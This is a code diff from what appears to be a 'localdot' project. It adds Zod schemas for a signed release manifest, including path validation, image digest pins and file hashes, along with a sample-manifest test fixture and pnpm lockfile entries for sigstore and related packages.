++// A path inside the package: relative, forward slashes, no empty, "." or ".." segment.
++export const PackagePath = z
++  .string()
++  .max(512)
++  .regex(/^[A-Za-z0-9_@+-][A-Za-z0-9._@+-]*(\/[A-Za-z0-9_@+-][A-Za-z0-9._@+-]*)*$/)
++  .refine((p) => !p.split("/").some((s) => s === "." || s === ".."), "no . or .. segments");
++
++export const ImagePin = z.strictObject({
++  repository: z.string().regex(/^ghcr\.io\/[a-z0-9-]+\/localdot-(desktop|gate|brain|browser)$/),
++  digest: z.string().regex(IMAGE_DIGEST),
++  platforms: z
++    .array(z.enum(["linux/arm64", "linux/amd64"]))
++    .min(1)
++    .refine((p) => p.includes("linux/arm64"), "every image must have linux/arm64")
++    .refine((p) => new Set(p).size === p.length, "no repeated platform"),
++});
++export type ImagePin = z.infer<typeof ImagePin>;
++
++export const ReleaseManifest = z.strictObject({
++  v: z.literal(1),
++  name: z.literal("localdot"),
++  version: z.string().regex(RELEASE_VERSION),
++  commit: z.string().regex(/^[0-9a-f]{40}$/),
++  // Every file of the localdot package but package.json and release.json, with its SHA-256.
++  files: z
++    .record(PackagePath, z.string().regex(SHA256_HEX))
++    .refine((f) => Object.keys(f).length > 0),
++  keyd: z.strictObject({
++    package: z.literal(KEYD_PACKAGE),
++    path: z.literal("bin/keyd"),
++    sha256: z.string().regex(SHA256_HEX),
++    identifier: z.literal(KEYD_IDENTIFIER),
++    teamId: z.string().regex(/^[A-Z0-9]{10}$/),
++  }),
++  images: z.strictObject({
++    desktop: ImagePin,
++    gate: ImagePin,
++    brain: ImagePin,
++    browser: ImagePin,
++  }),
++});
++export type ReleaseManifest = z.infer<typeof ReleaseManifest>;
++
++// The reference a cell is created from: never a tag.
++export function imageRef(pin: ImagePin): string {
++  return `${pin.repository}@${pin.digest}`;
++}
+diff --git a/packages/protocol/src/testing/index.ts b/packages/protocol/src/testing/index.ts
+new file mode 100644
+index 0000000..2ba82b0
+--- /dev/null
++++ b/packages/protocol/src/testing/index.ts
+@@ -0,0 +1 @@
++export * from "./sample-release.ts";
+diff --git a/packages/protocol/src/testing/sample-release.ts b/packages/protocol/src/testing/sample-release.ts
+new file mode 100644
+index 0000000..a998b53
+--- /dev/null
++++ b/packages/protocol/src/testing/sample-release.ts
+@@ -0,0 +1,45 @@
++const hex = (c: string) => c.repeat(64);
++
++export interface SampleImage {
++  repository: string;
++  digest: string;
++  platforms: string[];
++}
++
++export interface SampleManifest {
++  v: number;
++  name: string;
++  version: string;
++  commit: string;
++  files: Record<string, string>;
++  keyd: { package: string; path: string; sha256: string; identifier: string; teamId: string };
++  images: Record<"desktop" | "gate" | "brain" | "browser", SampleImage>;
++}
++
++const pin = (role: string): SampleImage => ({
++  repository: `ghcr.io/shadowhusky/localdot-${role}`,
++  digest: `sha256:${hex("a")}`,
++  platforms: ["linux/arm64", "linux/amd64"],
++});
++
++// A manifest that parses; tests mutate a fresh copy, loosely typed so they can break any field.
++export const sampleManifest = (): SampleManifest => ({
++  v: 1,
++  name: "localdot",
++  version: "1.0.0",
++  commit: "0".repeat(40),
++  files: { "dist/cli.mjs": hex("b"), "web/index.html": hex("c") },
++  keyd: {
++    package: "@localdot/keyd-darwin-arm64",
++    path: "bin/keyd",
++    sha256: hex("d"),
++    identifier: "dev.localdot.keyd",
++    teamId: "TESTTEAM01",
++  },
++  images: {
++    desktop: pin("desktop"),
++    gate: pin("gate"),
++    brain: pin("brain"),
++    browser: pin("browser"),
++  },
++});
+diff --git a/pnpm-lock.yaml b/pnpm-lock.yaml
+index eeab9e0..7bcde6f 100644
+--- a/pnpm-lock.yaml
++++ b/pnpm-lock.yaml
+@@ -24,6 +24,15 @@ importers:
+         specifier: 5.0.3
+         version: 5.0.3(@types/node@24.19.0)(jsdom@30.1.1)(vite@8.3.1(@types/node@24.19.0)(esbuild@0.28.2)(tsx@4.23.15))
+ 
++  apps/cli:
++    dependencies:
++      '@localdot/protocol':
++        specifier: workspace:*
++        version: link:../../packages/protocol
++      sigstore:
++        specifier: 5.0.0
++        version: 5.0.0
++
+   apps/daemon:
+     dependencies:
+       '@hono/node-server':
+@@ -506,6 +515,10 @@ packages:
+       '@noble/hashes':
+         optional: true
+ 
++  '@gar/promise-retry@1.0.3':
++    resolution: {integrity: sha512-GmzA9ckNokPypTg10pgpeHNQe7ph+iIKKmhKu3Ob9ANkswreCx7R3cKmY781K8QK3AqVL3xVh9A42JvIAbkkSA==}
++    engines: {node: ^20.17.0 || >=22.9.0}
++
+   '@hono/node-server@2.1.3':
+     resolution: {integrity: sha512-TA//nWMqPhbfdfneACk6t5a9eqbS9lABEPyKn0/xZTah3H3U2XaVg85rJFl0/Fyit0I552YDHgXGVSf3GwqbUw==}
+     engines: {node: '>=20'}
+@@ -694,6 +707,18 @@ packages:
+       '@cfworker/json-schema':
+         optional: true
+ 
++  '@npmcli/agent@5.0.2':
++    resolution: {integrity: sha512-EkzGmEsgbQ1rqWkRJe2P0oQHx/ylZozDUNPMXCklLuSFL3GY+QyEfBUjhjCsgGXzh4OGpnHvkboSQgczjP/jJg==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
++  '@npmcli/fs@6.0.0':
++    resolution: {integrity: sha512-AheOs4swKka/XLtht6xxJDPezlQ7K2IYQ9Y8lST4JLDjnralnWuMM9AE2CdVcgQJ5omrXhsRzM7F7aYmeZBvKQ==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
++  '@npmcli/redact@5.0.0':
++    resolution: {integrity: sha512-3zcN5Q3yEmeyxXBzqB6fXPQFzYa2ROsGFSr69W0ArXIAGJqxl/aFECOVPD2kbkYPm0U/EHxFKgclK3UA9WQg5A==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
+   '@oxc-project/types@0.152.0':
+     resolution: {integrity: sha512-oM/5rLBm2tPkg0iBgkH/FOeR3PCDpY19GTgAZjMFM8h9WI9VW7cLgzp6nwtarYKmovavIQZ+Fe/RKX/8C8O/Rw==}
+ 
+@@ -804,6 +829,30 @@ packages:
+   '@rolldown/pluginutils@1.0.1':
+     resolution: {integrity: sha512-2j9bGt5Jh8hj+vPtgzPtl72j0yRxHAyumoo6TNfAjsLB04UtpSvPbPcDcBMxz7n+9CYB0c1GxQFxYRg2jimqGw==}
+ 
++  '@sigstore/bundle@5.0.0':
++    resolution: {integrity: sha512-wefjygudENbzbQMks1t5u34EP0fFoD0XvaEP7DOUP/sXKvogzEJYFw5E6pegGyp3onGWzVEYKVa3bNZWyTYX+A==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
++  '@sigstore/core@4.0.1':
++    resolution: {integrity: sha512-9v5hRjujn5NXq8o7XFEUgLyAtdr5Iisb4pzM05u3K61IS5q3hP3luWAndk0RkPPLTUFoTbg7Vb84UQ1ZQeajWQ==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
++  '@sigstore/protobuf-specs@0.5.2':
++    resolution: {integrity: sha512-SQqvFMt4V78fdjcDdYX6HbiVSOR4QK3ZgwCa2KOsopAgPIHy1rU5UDUmzLl02r5oyyaYcYHR1hpwDRk/yUe+Mw==}
++    engines: {node: ^18.17.0 || >=20.5.0}
++
++  '@sigstore/sign@5.0.0':
++    resolution: {integrity: sha512-DSFivqz9/i5AkwZ5fq0YdjaJlc4o1WeS2Zffon0kqtChx0vy4W9NOjkEet9bF2vkzOufX72eVH8kZBIGtcBp1w==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
++  '@sigstore/tuf@5.0.0':
++    resolution: {integrity: sha512-Zyqg9tcHps3uRAlKHLNmsW4ohsUZAjb9G+31r7lg0ICh/JOcadzmJsIRdjKljlRHpaR0K4aJ2kXXIdywdcdMlA==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
++  '@sigstore/verify@4.1.2':
++    resolution: {integrity: sha512-BfD9eLrz3A/DG58aSgfgZYmIR6V9Yw96QVN/frtu2bEH7ctSTk2TDvHU12un3JsDPBTqTNkqkIkucjxljpOFqQ==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
+   '@standard-schema/spec@1.1.0':
+     resolution: {integrity: sha512-l2aFy5jALhniG5HgqrD6jXLi/rUWrKvqN/qJx6yoJsgKhblVd+iqqU4RCXavm/jPityDo5TCvKMnpjKnOriy0w==}
+ 
+@@ -826,6 +875,14 @@ packages:
+       '@types/react-dom':
+         optional: true
+ 
++  '@tufjs/canonical-json@2.0.0':
++    resolution: {integrity: sha512-yVtV8zsdo8qFHe+/3kw81dSLyF7D576A5cCFCi4X7B39tWT7SekaEFUnvnWJHz+9qO7qJTah1JbrDjWKqFtdWA==}
++    engines: {node: ^16.14.0 || >=18.0.0}
++
++  '@tufjs/models@5.0.0':
++    resolution: {integrity: sha512-U4mVcdFGOi6pt8n38LdWZp67Svn7ppnU1Pj8SGOVaBi1X4gm+G4ztQlLfkoJbKSHfjA6WeaiJp2A4V83AJF6nQ==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
+   '@types/aria-query@5.0.4':
+     resolution: {integrity: sha512-rfT93uj5s0PRL7EzccGMs3brplhcrghnDoV26NqKhCAS1hVo+WdNsPvE/yb6ilfr5hi2MEk6d5EWJTKdxg8jVw==}
+ 
+@@ -1013,6 +1070,10 @@ packages:
+     resolution: {integrity: sha512-5cvg6CtKwfgdmVqY1WIiXKc3Q1bkRqGLi+2W/6ao+6Y7gu/RCwRuAhGEzh5B4KlszSuTLgZYuqFqo5bImjNKng==}
+     engines: {node: '>= 0.6'}
+ 
++  agent-base@9.0.0:
++    resolution: {integrity: sha512-TQf59BsZnytt8GdJKLPfUZ54g/iaUL2OWDSFCCvMOhsHduDQxO8xC4PNeyIkVcA5KwL2phPSv0douC0fgWzmnA==}
++    engines: {node: '>= 20'}
++
+   ai@7.0.123:
+     resolution: {integrity: sha512-blyApVMNpQfendoGLAQRjQgh0EdbwhAI4SJYBTS4Dw+BygPzdj/Pcgt6AaClvy5+ibV8v+d+k8PABam0QxORtw==}
+     engines: {node: '>=22'}
+@@ -1045,6 +1106,10 @@ packages:
+     resolution: {integrity: sha512-Izi8RQcffqCeNVgFigKli1ssklIbpHnCYc6AknXGYoB6grJqyeby7jv12JUQgmTAnIDnbck1uxksT4dzN3PWBA==}
+     engines: {node: '>=12'}
+ 
++  balanced-match@4.0.4:
++    resolution: {integrity: sha512-BLrgEcRTwX2o6gGxGOCNyMvGSp35YofuYzw9h1IMTRmKqttAZZVU67bdb9Pr2vUHA8+j3i2tJfjO6C6+4myGTA==}
++    engines: {node: 18 || 20 || >=22}
++
+   bidi-js@1.1.0:
+     resolution: {integrity: sha512-fX1Onk0tdVPC7obPWB5EbJ1z7NVhLq4m2xZLq2YXBkxzMXIGRpNMU88n0EPgWseKl12J7zXs7qrDxPK4sRs2fg==}
+ 
+@@ -1052,10 +1117,18 @@ packages:
+     resolution: {integrity: sha512-2cGmJupaNgg+QUwVLAucDuWuoMZ6EX9iHDRswZ5lsNYEmwPaRknMPCLZz07yTzVq/83p4o/wzbDZbBrTvGGTIw==}
+     engines: {node: '>=18'}
+ 
++  brace-expansion@5.0.12:
++    resolution: {integrity: sha512-YovQ3rzhaLMIrDjNDMkNS01tea93qhEhG5xy8f6+R0l+dw3Ki+5sCoIoI942iuLZTHWogWktgwVDhU09iNEimQ==}
++    engines: {node: 20 || >=22}
++
+   bytes@3.1.2:
+     resolution: {integrity: sha512-/Nf7TyzTx6S3yRJObOAV7956r8cr2+Oj8AC5dt8wSP3BQAoeX58NoHyCU8P8zGkNXStjTSi6fzO6F0pBdcYbEg==}
+     engines: {node: '>= 0.8'}
+ 
++  cacache@21.0.1:
++    resolution: {integrity: sha512-pTwz/uj3Jyp6WXdJ6fWhR+7LVxVs6RyroQSn7KJwHsSxXuyGSp0pcMVcwSwTpCFq1X2YG8QBe0W+vN+cr0SwzA==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
+   call-bind-apply-helpers@1.0.2:
+     resolution: {integrity: sha512-Sp1ablJ0ivDkSzjcaJdxEunN5/XvksFJ2sMBFfq6x0ryhQV/2b/KwFe21cMpmHtPOSij8K99/wSfoEuTObmuMQ==}
+     engines: {node: '>= 0.4'}
+@@ -1244,6 +1317,10 @@ packages:
+     resolution: {integrity: sha512-Rx/WycZ60HOaqLKAi6cHRKKI7zxWbJ31MhntmtwMoaTeF7XFH9hhBp8vITaMidfljRQ6eYWCKkaTK+ykVJHP2A==}
+     engines: {node: '>= 0.8'}
+ 
++  fs-minipass@3.0.3:
++    resolution: {integrity: sha512-XUBA9XClHbnJWSfBzjkm6RvPsyg3sryZt06BEQoXcF7EK/xpGaQYJgQKDJSUH5SGZ76Y7pFx1QBnXz09rU5Fbw==}
++    engines: {node: ^14.17.0 || ^16.13.0 || >=18.0.0}
++
+   fsevents@2.3.3:
+     resolution: {integrity: sha512-5xoDfX+fL7faATnagmWPpbFtwh/R77WmMMqqHGS65C3vvB0YHrgF+B1YmZ3441tMj5n63k0212XNoJwzlhffQw==}
+     engines: {node: ^8.16.0 || ^10.6.0 || >=11.0.0}
+@@ -1260,6 +1337,10 @@ packages:
+     resolution: {integrity: sha512-sTSfBjoXBp89JvIKIefqw7U2CCebsc74kiY6awiGogKtoSGbgjYE/G/+l9sF3MWFPNc9IcoOC4ODfKHfxFmp0g==}
+     engines: {node: '>= 0.4'}
+ 
++  glob@13.0.6:
++    resolution: {integrity: sha512-Wjlyrolmm8uDpm/ogGyXZXb1Z+Ca2B8NbJwqBVg0axK9GbBeoS7yGV6vjXnYdGm6X53iehEuxxbyiKp8QmN4Vw==}
++    engines: {node: 18 || 20 || >=22}
++
+   gopd@1.2.0:
+     resolution: {integrity: sha512-ZUKRh6/kUFoAiTAtTYPZJ3hw9wNxx+BIBOijnlG9PnrJsCcSjs1wyyD6vJpaYtgnzDrKYRSqf3OO6Rfa93xsRg==}
+     engines: {node: '>= 0.4'}
+@@ -1280,14 +1361,25 @@ packages:
+     resolution: {integrity: sha512-UikN5yr7xsCDAq87Or5or0PAlD3HJJOKVzM05az588WnpDJ4Ux7a2A53Qi6gofGg2/EtvF/H4hCi/TXfCW4Y6w==}
+     engines: {node: ^22.13.0 || >=24.0.0}
+ 
++  http-cache-semantics@4.2.0:
++    resolution: {integrity: sha512-dTxcvPXqPvXBQpq5dUr6mEMJX4oIEFv6bwom3FDwKRDsuIjjJGANqhBuoAn9c1RQJIdAKav33ED65E2ys+87QQ==}
++
+   http-errors@2.0.1:
+     resolution: {integrity: sha512-4FbRdAX+bSdmo4AUFuS0WNiPz8NgFt+r8ThgNWmlrjQjt1Q7ZR9+zTlce2859x4KSXrwIsaeTqDoKQmtP8pLmQ==}
+     engines: {node: '>= 0.8'}
+ 
++  http-proxy-agent@9.1.0:
++    resolution: {integrity: sha512-2NxoveTT58mjYT4n3RPTEfCZGLMbidoO8XEieXfpSYxu+PQJ1qpx4ypwH6N+uF9twBPIvRRgvkvW5HUTYWENig==}
++    engines: {node: '>= 20'}
++
+   http-proxy@1.18.1:
+     resolution: {integrity: sha512-7mz/721AbnJwIVbnaSv1Cz3Am0ZLT/UBwkC92VlxhXv/k/BBQfM2fXElQNC27BVGr0uwUpplYPQM9LnaBMR5NQ==}
+     engines: {node: '>=8.0.0'}
+ 
++  https-proxy-agent@9.1.0:
++    resolution: {integrity: sha512-ag87y7cJJ9/3+GxFr8Oy4O5faDsGRGnBGsJj/YjOSsSx/5eadKLYTMPlzuR6obgoCDDm0abAAZitXXQkMOPSpA==}
++    engines: {node: '>= 20'}
++
+   iconv-lite@0.7.3:
+     resolution: {integrity: sha512-IKXpvIzjnC9XTAUbVBcMfGS0EPaIXtW6v+zr+RRp+hqULEpo0owZax6wyRwPOJbWbzjYspQwusTsfVr0ifh4uQ==}
+     engines: {node: '>=0.10.0'}
+@@ -1421,6 +1513,10 @@ packages:
+   magic-string@1.4.2:
+     resolution: {integrity: sha512-vG+rjFRj1PqdIBozIxAGMjPlOhaVe+GXpbttY/iSK7rGcJRMlwNJO7dcUwmUqkymsFLJiNGI06t4D7Fr7yRC9g==}
+ 
++  make-fetch-happen@16.0.1:
++    resolution: {integrity: sha512-uUv1yxHzaKVVEPfcFeGSNov/Cehjv08ovlY8ImTljgL7Q+SiA0dAYLQ6SYVa2kkKqNj4Y3aZEI7xv2teadie0A==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
+   math-intrinsics@1.1.0:
+     resolution: {integrity: sha512-/IXtbwEk5HTPyEwyKX6hGkYXxM9nbj64B+ilVJnC/R6B0pH5G4V3b0pVbL7DBj4tkhBAppbQUlf6F6Xl9LHu1g==}
+     engines: {node: '>= 0.4'}
+@@ -1444,6 +1540,42 @@ packages:
+     resolution: {integrity: sha512-Lbgzdk0h4juoQ9fCKXW4by0UJqj+nOOrI9MJ1sSj4nI8aI2eo1qmvQEie4VD1glsS250n15LsWsYtCugiStS5A==}
+     engines: {node: '>=18'}
+ 
++  minimatch@10.2.6:
++    resolution: {integrity: sha512-vpLQEs+VLCr1nU0BXS07maYoFwlDAH0gngQuuttxIwutDFEMHq2blX+8vpgxDdK3J1PwjCJiep77OitTZ4Ll1A==}
++    engines: {node: 18 || 20 || >=22}
++
++  minipass-collect@2.0.1:
++    resolution: {integrity: sha512-D7V8PO9oaz7PWGLbCACuI1qEOsq7UKfLotx/C0Aet43fCUB/wfQ7DYeq2oR/svFJGYDHPr38SHATeaj/ZoKHKw==}
++    engines: {node: '>=16 || 14 >=14.17'}
++
++  minipass-fetch@6.0.0:
++    resolution: {integrity: sha512-AWI8bKapGmgx/J0E6IGYSKj8TiHebZkmKWSs8raPSw8KXwgEAJ+Bw3+LSdXHR6T/RHKAWCOYk2MiLrYluaUU6w==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
++  minipass-flush@1.0.7:
++    resolution: {integrity: sha512-TbqTz9cUwWyHS2Dy89P3ocAGUGxKjjLuR9z8w4WUTGAVgEj17/4nhgo2Du56i0Fm3Pm30g4iA8Lcqctc76jCzA==}
++    engines: {node: '>= 8'}
++
++  minipass-pipeline@1.2.4:
++    resolution: {integrity: sha512-xuIq7cIOt09RPRJ19gdi4b+RiNvDFYe5JH+ggNvBqGqpQXcru3PcRmOZuHBKWK1Txf9+cQ+HMVN4d6z46LZP7A==}
++    engines: {node: '>=8'}
++
++  minipass-sized@2.0.0:
++    resolution: {integrity: sha512-zSsHhto5BcUVM2m1LurnXY6M//cGhVaegT71OfOXoprxT6o780GZd792ea6FfrQkuU4usHZIUczAQMRUE2plzA==}
++    engines: {node: '>=8'}
++
++  minipass@3.3.6:
++    resolution: {integrity: sha512-DxiNidxSEK+tHG6zOIklvNOwm3hvCrbUrdtzY74U6HKTJxvIDfOUL5W5P2Ghd3DTkhhKPYGqeNUIh5qcM4YBfw==}
++    engines: {node: '>=8'}
++
++  minipass@7.1.3:
++    resolution: {integrity: sha512-tEBHqDnIoM/1rXME1zgka9g6Q2lcoCkxHLuc7ODJ5BxbP5d4c2Z5cGgtXAku59200Cx7diuHTOYfSBD8n6mm8A==}
++    engines: {node: '>=16 || 14 >=14.17'}
++
++  minizlib@3.1.0:
++    resolution: {integrity: sha512-KZxYo1BUkWD2TVFLr0MQoM8vUUigWD3LlD83a/75BqC+4qE0Hb1Vo5v1FgcfaNXvfXzr+5EhQ6ing/CaBijTlw==}
++    engines: {node: '>= 18'}
++
+   ms@2.1.3:
+     resolution: {integrity: sha512-6FlzubTLZG3J2a/NVCAleEhjzq5oxgHyaCU9yYXvcLsvoVaHJq/s5xXI6/XXP6tz7R9xAOtHnSO/tXtF3WRTlA==}
+ 
+@@ -1479,6 +1611,10 @@ packages:
+   once@1.4.0:
+     resolution: {integrity: sha512-lNaJgI+2Q5URQBkccEKHTQOPaXdUxnZZElQTZY0MFUAuaEqe1E+Nyvgdz/aIyNi6Z9MzO5dv1H8n58/GELp3+w==}
+ 
++  p-map@7.0.8:
++    resolution: {integrity: sha512-MitaVsCuCFIvOLLPIU7NnfrZvS9H9h7kwMUkDo+T2pEISaJD48IV9S8iIdXB7PsvvdxyYcsSTTrr90XKsbulNw==}
++    engines: {node: '>=18'}
++
+   parse5@8.0.1:
+     resolution: {integrity: sha512-z1e/HMG90obSGeidlli3hj7cbocou0/wa5HacvI3ASx34PecNjNQeaHNo5WIZpWofN9kgkqV1q5YvXe3F0FoPw==}
+ 
+@@ -1490,6 +1626,10 @@ packages:
+     resolution: {integrity: sha512-ojmeN0qd+y0jszEtoY48r0Peq5dwMEkIlCOu6Q5f41lfkswXuKtYrhgoTpLnyIcHm24Uhqx+5Tqm2InSwLhE6Q==}
+     engines: {node: '>=8'}
+ 
++  path-scurry@2.0.2:
++    resolution: {integrity: sha512-3O/iVVsJAPsOnpwWIeD+d6z/7PmqApyQePUtCndjatj/9I5LylHvt5qluFaBT3I5h3r1ejfR056c+FCv+NnNXg==}
++    engines: {node: 18 || 20 || >=22}
++
+   path-to-regexp@8.4.2:
+     resolution: {integrity: sha512-qRcuIdP69NPm4qbACK+aDogI5CBDMi1jKe0ry5rSQJz8JVLsC7jV8XpiJjGRLLol3N+R5ihGYcrPLTno6pAdBA==}
+ 
+@@ -1522,10 +1662,23 @@ packages:
+     resolution: {integrity: sha512-Qb1gy5OrP5+zDf2Bvnzdl3jsTf1qXVMazbvCoKhtKqVs4/YK4ozX4gKQJJVyNe+cajNPn0KoC0MC3FUmaHWEmQ==}
+     engines: {node: ^10.13.0 || ^12.13.0 || ^14.15.0 || >=15.0.0}
+ 
++  proc-log@7.0.0:
++    resolution: {integrity: sha512-FYgfaA69XZ93zaXLoMNQ+ViDXGGBgR8aLh03txzcFhV+9xOXx7+8DLCULrKKpR9+GsH9ZfHm82aSUPpozX0Ztg==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
+   proxy-addr@2.0.8:
+     resolution: {integrity: sha512-5nnx0yGyVUcY6t9RnWcARWtwT9F1D8O9rt08htPvnd49W1IgZtmLkhu9WfMzQj1cFxjHIO6connUNVW5k7AVyQ==}
+     engines: {node: '>= 0.10'}
+ 
++  proxy-agent-negotiate@1.1.0:
++    resolution: {integrity: sha512-N8IBcM3UgCVzz2L2Lqv8DVntDnnC8/hiV4nEDUPkqq72TPUgYWjQc+bdZlBPZK9LzPAvOY//gAt0S0DApoOXWQ==}
++    engines: {node: '>= 20'}
++    peerDependencies:
++      kerberos: ^2.0.0
++    peerDependenciesMeta:
++      kerberos:
++        optional: true
++
+   punycode@2.3.1:
+     resolution: {integrity: sha512-vYt7UD1U9Wg6138shLtLOvdAu+8DsC/ilFtEVHcH+wydcSpNE20AfSOduf6MkRFahL5FY7X1oU7nKVZFtfq8Fg==}
+     engines: {node: '>=6'}
+@@ -1629,10 +1782,30 @@ packages:
+     resolution: {integrity: sha512-6x6dK6zJdpTzF4sQeNYxwtvBzf6Eg4GtlesS94HOvTudUeyK2WXAaIfmDgsyslYrRBeFIlsi54AYsFGUuhmvrQ==}
+     engines: {node: '>= 0.4'}
+ 
++  sigstore@5.0.0:
++    resolution: {integrity: sha512-hJqJfoG/e4qFQaauQL00c6J6FrHLBGKtkFvW3JbTSIEFOhLrSjdSM/gWd/yUOfYo/gsERehTXGC1VZWX+9X4Dg==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
++  smart-buffer@4.2.0:
++    resolution: {integrity: sha512-94hK0Hh8rPqQl2xXc3HsaBoOXKV20MToPkcXvwbISWLEs+64sBq5kFgn2kJDHb1Pry9yrP0dxrCI9RRci7RXKg==}
++    engines: {node: '>= 6.0.0', npm: '>= 3.0.0'}
++
++  socks-proxy-agent@10.1.0:
++    resolution: {integrity: sha512-WlMj/67cEJ6MDI1OcsnjuYKDNDoyPCCYZ249kuuXPiMDw9F8PXkVaQ7YWu3siTydfQ/4BEZcvGzu+aYvz7dDCQ==}
++    engines: {node: '>= 20'}
++
++  socks@2.8.10:
++    resolution: {integrity: sha512-e0VyvkVTwVYViNovRkZ9aodhxVlyoMn7eJhVUPxZ+eK9P/7CBkxvvsBOHqFPEH416726W8tLXXXjKwqgTErrCQ==}
++    engines: {node: '>= 10.0.0', npm: '>= 3.0.0'}
++
+   source-map-js@1.2.2:
+     resolution: {integrity: sha512-KGj/8Y43x35aZVDtt+J4mK1hoLGHULMYfSkODJNQjNDC3oW1PqPoxMwo0pLUsWM/UEGzON/NxeHywEfNXNP3Vw==}
+     engines: {node: '>=0.10.0'}
+ 
++  ssri@14.0.0:
++    resolution: {integrity: sha512-jQxKI0yx0ZnTKrqjKkLDV2DXkBQn3k49JVmVqDGcDwKDtGDbImD/GXsq04KD0VVzCQQ9wZJYal3RwR1GzWTSow==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
+   statuses@2.0.2:
+     resolution: {integrity: sha512-DvEy55V3DB7uknRo+4iOGT5fP1slR8wQohVdknigZPMpMstaKJQWhwiYBACJE3Ul2pTnATihhBYnRhZQHGBiRw==}
+     engines: {node: '>= 0.8'}
+@@ -1679,6 +1852,10 @@ packages:
+     engines: {node: '>=18.0.0'}
+     hasBin: true
+ 
++  tuf-js@6.0.0:
++    resolution: {integrity: sha512-zlJVOIO68hmgo1//X4ENEcTGfuOTAtDPi8PsTsG+FyxD85E/ww1ZnwBbWo/yCEExGpI+Kilg7Z3qCdHX2BoJTQ==}
++    engines: {node: ^22.22.2 || ^24.15.0 || >=26.0.0}
++
+   type-is@2.1.0:
+     resolution: {integrity: sha512-faYHw0anBbc/kWF3zFTEnxSFOAGUX9GFbOBthvDdLsIlEoWOFOtS0zgCiQYwIskL9iGXZL3kAXD8OoZ4GmMATA==}
+     engines: {node: '>= 18'}
+@@ -1843,6 +2020,9 @@ packages:
+   xmlchars@2.2.0:
+     resolution: {integrity: sha512-JZnDKK8B0RCDw84FNdDAIpZK+JuJw+s7Lz8nksI7SIuU3UXJJslUthsi+uWBUYOwPFwW7W7PRLRfUKpxjtjFCw==}
+ 
++  yallist@4.0.0:
++    resolution: {integrity: sha512-3wdGidZyq5PB084XLES5TpOSRA3wjXAlIWMhum2kRcv/41Sn2emQ0dycQW4uZXLejwKvg6EsvbdlVL+FYEct7A==}
++
+   zod-to-json-schema@3.25.2:
+     resolution: {integrity: sha512-O/PgfnpT1xKSDeQYSCfRI5Gy3hPf91mKVDuYLUHZJMiDFptvP41MSnWofm8dnCm0256ZNfZIM7DSzuSMAFnjHA==}
+     peerDependencies:
+@@ -2080,6 +2260,8 @@ snapshots:
+ 
+   '@exodus/bytes@1.16.0': {}
+ 
++  '@gar/promise-retry@1.0.3': {}
++
+   '@hono/node-server@2.1.3(hono@4.13.12)':
+     dependencies:
+       hono: 4.13.12
+@@ -2221,6 +2403,23 @@ snapshots:
+     transitivePeerDependencies:
+       - supports-color
+ 
++  '@npmcli/agent@5.0.2':
++    dependencies:
++      agent-base: 9.0.0
++      http-proxy-agent: 9.1.0
++      https-proxy-agent: 9.1.0
++      lru-cache: 11.5.3
++      socks-proxy-agent: 10.1.0
++    transitivePeerDependencies:
++      - kerberos
++      - supports-color
++
++  '@npmcli/fs@6.0.0':
++    dependencies:
++      semver: 7.8.5
++
++  '@npmcli/redact@5.0.0': {}
++
+   '@oxc-project/types@0.152.0': {}
+ 
+   '@playwright/test@1.63.0':
+@@ -2276,6 +2475,39 @@ snapshots:
+ 
+   '@rolldown/pluginutils@1.0.1': {}
+ 
++  '@sigstore/bundle@5.0.0':
++    dependencies:
++      '@sigstore/protobuf-specs': 0.5.2
++
++  '@sigstore/core@4.0.1': {}
++
++  '@sigstore/protobuf-specs@0.5.2': {}
++
++  '@sigstore/sign@5.0.0':
++    dependencies:
++      '@gar/promise-retry': 1.0.3
++      '@sigstore/bundle': 5.0.0
++      '@sigstore/core': 4.0.1
++      '@sigstore/protobuf-specs': 0.5.2
++      make-fetch-happen: 16.0.1
++      proc-log: 7.0.0
++    transitivePeerDependencies:
++      - kerberos
++      - supports-color
++
++  '@sigstore/tuf@5.0.0':
++    dependencies:
++      '@sigstore/protobuf-specs': 0.5.2
++      tuf-js: 6.0.0
++    transitivePeerDependencies:
++      - supports-color
++
++  '@sigstore/verify@4.1.2':
++    dependencies:
++      '@sigstore/bundle': 5.0.0
++      '@sigstore/core': 4.0.1
++      '@sigstore/protobuf-specs': 0.5.2
++
+   '@standard-schema/spec@1.1.0': {}
+ 
+   '@testing-library/dom@10.4.2':
+@@ -2299,6 +2531,13 @@ snapshots:
+       '@types/react': 19.3.0
+       '@types/react-dom': 19.3.0(@types/react@19.3.0)
+ 
++  '@tufjs/canonical-json@2.0.0': {}
++
++  '@tufjs/models@5.0.0':
++    dependencies:
++      '@tufjs/canonical-json': 2.0.0
++      minimatch: 10.2.6
++
+   '@types/aria-query@5.0.4': {}
+ 
+   '@types/chai@5.2.3':
+@@ -2411,6 +2650,8 @@ snapshots:
+       mime-types: 3.0.2
+       negotiator: 1.1.0
+ 
++  agent-base@9.0.0: {}
++
+   ai@7.0.123(zod@4.6.5):
+     dependencies:
+       '@ai-sdk/gateway': 4.0.101(zod@4.6.5)
+@@ -2439,6 +2680,8 @@ snapshots:
+ 
+   assertion-error@2.0.1: {}
+ 
++  balanced-match@4.0.4: {}
++
+   bidi-js@1.1.0:
+     dependencies:
+       require-from-string: 2.0.2
+@@ -2457,8 +2700,25 @@ snapshots:
+     transitivePeerDependencies:
+       - supports-color
+ 
++  brace-expansion@5.0.12:
++    dependencies:
++      balanced-match: 4.0.4
++
+   bytes@3.1.2: {}
+ 
++  cacache@21.0.1:
++    dependencies:
++      '@npmcli/fs': 6.0.0
++      fs-minipass: 3.0.3
++      glob: 13.0.6
